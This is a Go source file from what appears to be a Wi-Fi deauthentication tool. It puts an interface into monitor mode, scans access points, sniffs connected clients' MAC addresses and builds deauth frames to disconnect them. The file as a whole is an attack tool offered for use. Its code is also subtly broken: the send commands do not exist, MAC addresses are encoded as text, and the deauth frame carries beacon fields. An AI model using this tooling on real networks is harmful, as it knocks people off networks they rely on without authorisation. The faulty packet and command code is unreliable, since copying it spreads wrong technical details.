package interfaces

import (
	"deauth/color"
	"deauth/userIO"
	"errors"
	"fmt"
	"os/exec"
	"runtime"
	"strings"

	"github.com/google/gopacket"
	"github.com/google/gopacket/pcap"
)

type iface struct {
	Name  string
	Mode  string
	Inter pcap.Interface
}

// askInterface ask the user to select an interface
func AskInterface() (iface, error) {
	ifacesList := GetInterfaces()
	ShowInterfaces(ifacesList)
	choice := ""
	for choice == "" {
		choice = userIO.Prompt("Select an interface: ")
		if choice == "" {
			// return to previous line
			fmt.Print("\033[F")
		}
	}
	// from string to net.interface
	for _, inter := range ifacesList {
		if choice == inter.Name {
			i := iface{Name: choice, Inter: inter}
			i.Mode = i.GetMode()
			fmt.Println(i)
			return i, nil
		}
	}
	return iface{}, errors.New(choice + " : not a valid interface")
}

func (i iface) GetMode() string {
	if runtime.GOOS == "windows" {
		cmd := exec.Command("netsh", "wlan", "show", "interface", i.Name, "show", "mode")
		out, err := cmd.Output()
		if err != nil {
			fmt.Println("err :", err)
			return ""
		}
		return strings.Split(string(out), ":")[1]
	} else {
		cmd := exec.Command("iwconfig", i.Name)
		out, err := cmd.Output()
		if err != nil {
			fmt.Println("err :", err)
			return ""
		}
		// get the mode from the out
		mode := strings.Split(string(out), " ")
		for i := range mode {
			if strings.Contains(mode[i], "Mode") {
				buff := strings.Split(mode[i], ":")[1]
				return buff
			}
		}
	}
	return "managed"
}

func ShowInterfaces(ifaces []pcap.Interface) {
	if runtime.GOOS == "windows" {
		for i := range ifaces {
			fmt.Println(color.ColorPrint("green", "\t=>"), ifaces[i].Name+" : "+ifaces[i].Description)
		}
	} else {
		for i := range ifaces {
			fmt.Println(color.ColorPrint("green", "\t=>"), ifaces[i].Name)
		}
	}
}

func GetInterfaces() []pcap.Interface {
	ifaces, err := pcap.FindAllDevs()
	if err != nil {
		fmt.Println("err :", err)
		return nil
	}
	return ifaces
}

// SetMonitorMode set the interface to monitor mode
func (i *iface) SetMonitorMode() error {
	if runtime.GOOS == "windows" {
		cmd := exec.Command("netsh", "interface", "set", "interface", i.Name, "mode=monitor")
		err := cmd.Run()
		if err != nil {
			return err
		}
	} else {
		cmd := exec.Command("ifconfig", i.Name, "down")
		err := cmd.Run()
		if err != nil {
			return err
		}
		cmd = exec.Command("iwconfig", i.Name, "mode", "monitor")
		err = cmd.Run()
		if err != nil {
			return err
		}
		cmd = exec.Command("ifconfig", i.Name, "up")
		err = cmd.Run()
		if err != nil {
			return err
		}
	}
	i.Mode = "monitor"
	return nil
}

// Reset reset the interface to normal mode
func (i *iface) Reset() {
	if runtime.GOOS == "windows" {
		cmd := exec.Command("netsh", "interface", "set", "interface", i.Name, "mode=managed")
		err := cmd.Run()
		if err != nil {
			fmt.Println("err :", err)
		}
	} else {
		cmd := exec.Command("ifconfig", i.Name, "down")
		err := cmd.Run()
		if err != nil {
			fmt.Println("err :", err)
		}
		cmd = exec.Command("iwconfig", i.Name, "mode", "managed")
		err = cmd.Run()
		if err != nil {
			fmt.Println("err :", err)
		}
		cmd = exec.Command("ifconfig", i.Name, "up")
		err = cmd.Run()
		if err != nil {
			fmt.Println("err :", err)
		}
	}
	i.Mode = "managed"
}

func ParseScan(out string) []string {
	var res []string
	for _, line := range strings.Split(out, "\n") {
		if strings.Contains(line, "Address: ") {
			res = append(res, strings.Split(line, "Address: ")[1])
		}
	}
	return res
}

func ShowAPs(APs []string) {
	for i := range APs {
		fmt.Println(color.ColorPrint("green", "\t=>"), APs[i])
	}
}

func AskAP(APs []string) string {
	ShowAPs(APs)
	choice := ""
	for choice == "" {
		choice = userIO.Prompt(color.ColorPrint("cyan", "AP ") + "=> ")
		if choice == "" {
			fmt.Print("\033[F") // go back to previous line
		}
	}
	return choice
}

func (i iface) GetBSSID() string {
	if runtime.GOOS == "windows" {
		cmd := exec.Command("netsh", "wlan", "show", "interface", i.Name, "show", "bssid")
		out, err := cmd.Output()
		if err != nil {
			fmt.Println("err :", err)
			return ""
		}
		return strings.Split(string(out), ":")[1]
	} else {
		cmd := exec.Command("iwconfig", i.Name)
		out, err := cmd.Output()
		if err != nil {
			fmt.Println("err :", err)
			return ""
		}
		return strings.Split(string(out), "Access Point: ")[1]
	}
}

func (i iface) GetSSID() string {
	if runtime.GOOS == "windows" {
		cmd := exec.Command("netsh", "wlan", "show", "interface", i.Name, "show", "ssid")
		out, err := cmd.Output()
		if err != nil {
			fmt.Println("err :", err)
			return ""
		}
		return strings.Split(string(out), ":")[1]
	} else {
		cmd := exec.Command("iwconfig", i.Name)
		out, err := cmd.Output()
		if err != nil {
			fmt.Println("err :", err)
			return ""
		}
		return strings.Split(string(out), "ESSID: ")[1]
	}
}

// return the mac address of the access points scanned by the interface
func (i iface) GetAPs() []string {
	if runtime.GOOS == "windows" {
		cmd := exec.Command("netsh", "wlan", "show", "network", "mode=bssid")
		out, err := cmd.Output()
		if err != nil {
			fmt.Println("err :", err)
			return nil
		}
		return ParseScan(string(out))
	} else {
		cmd := exec.Command("iwlist", i.Name, "scan")
		out, err := cmd.Output()
		if err != nil {
			fmt.Println("err :", err)
			return nil
		}
		return ParseScan(string(out))
	}
}

// GetClient scan pcap packages to get the mac address of the clients connected to the access point
func (i iface) GetClient() []string {
	var clients []string
	// get the mac address of the access point
	bssid := i.GetBSSID()
	// get the mac address of the clients connected to the access point
	handle, err := pcap.OpenLive(i.Name, 1600, true, pcap.BlockForever)
	if err != nil {
		fmt.Println("err :", err)
		return nil
	}
	defer handle.Close()
	// filter the packages to get only the packages from the access point
	err = handle.SetBPFFilter("ether src " + bssid)
	if err != nil {
		fmt.Println("err :", err)
		return nil
	}
	// get the packages
	packetSource := gopacket.NewPacketSource(handle, handle.LinkType())
	for packet := range packetSource.Packets() {
		// get the mac address of the client
		client := packet.LinkLayer().LayerContents()
		// add the client to the list
		clients = append(clients, string(client))
	}
	// remove doublons in the list
	clients = removeDuplicates(clients)
	return clients
}

func removeDuplicates(elements []string) []string {
	for i := 0; i < len(elements); i++ {
		for j := i + 1; j < len(elements); j++ {
			if elements[i] == elements[j] {
				elements = append(elements[:j], elements[j+1:]...)
			}
		}
	}
	return elements
}

func AskClient(clients []string) string {
	ShowClients(clients)
	choice := ""
	for choice == "" {
		choice = userIO.Prompt(color.ColorPrint("cyan", "client ") + "=> ")
		if choice == "" {
			fmt.Print("\033[F") // go back to previous line
		}
	}
	return choice
}

func ShowClients(clients []string) {
	for i := range clients {
		fmt.Println(color.ColorPrint("green", "\t=>"), clients[i])
	}
}

func (i iface) Send(packet []byte, client string) {
	if runtime.GOOS == "windows" {
		cmd := exec.Command("netsh", "wlan", "send", "bssid", i.GetBSSID(), "dest="+client, "data="+string(packet))
		out, err := cmd.Output()
		if err != nil {
			fmt.Println("err :", err)
			return
		}
		fmt.Println(string(out))
	} else {
		cmd := exec.Command("iwconfig", i.Name, "essid", i.GetSSID(), "ap", i.GetBSSID(), "key", "off")
		out, err := cmd.Output()
		if err != nil {
			fmt.Println("err :", err)
			return
		}
		fmt.Println(string(out))
		cmd = exec.Command("iwconfig", i.Name, "essid", i.GetSSID(), "ap", i.GetBSSID(), "key", "on", "key", "1", "off", "1", string(packet))
		out, err = cmd.Output()
		if err != nil {
			fmt.Println("err :", err)
			return
		}
		fmt.Println(string(out))
	}
}

// send Deauth packet to the client
func Deauth(i iface, ap string, client string) {
	// create the packet
	packet := createDeauthPacket(i, ap, client)
	// send the packet to the client
	i.Send(packet, client)
}

// create the packet to send to the client deautg
func createDeauthPacket(i iface, ap string, client string) []byte {
	// create the packet
	packet := []byte{0xC0, 0x00}
	// add the mac address of the access point
	packet = append(packet, []byte(ap)...)
	// add the mac address of the client
	packet = append(packet, []byte(client)...)
	// add the mac address of the access point
	packet = append(packet, []byte(ap)...)
	// add the mac address of the client
	packet = append(packet, []byte(client)...)
	// add the reason code
	packet = append(packet, 0x00, 0x00)
	// add the sequence number
	packet = append(packet, 0x00, 0x00)
	// add the timestamp
	packet = append(packet, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00)
	// add the beacon interval
	packet = append(packet, 0x00, 0x00)
	// add the capability information
	packet = append(packet, 0x00, 0x00)
	// add the ssid
	packet = append(packet, []byte(i.GetSSID())...)
	// add the supported rates
	packet = append(packet, 0x01, 0x08, 0x82, 0x84, 0x8b, 0x96, 0x0c, 0x12, 0x18, 0x24, 0x30, 0x48, 0x60, 0x6c)
	// add the ds parameter set
	packet = append(packet, 0x03, 0x01, 0x00, 0x00)

	return packet
}
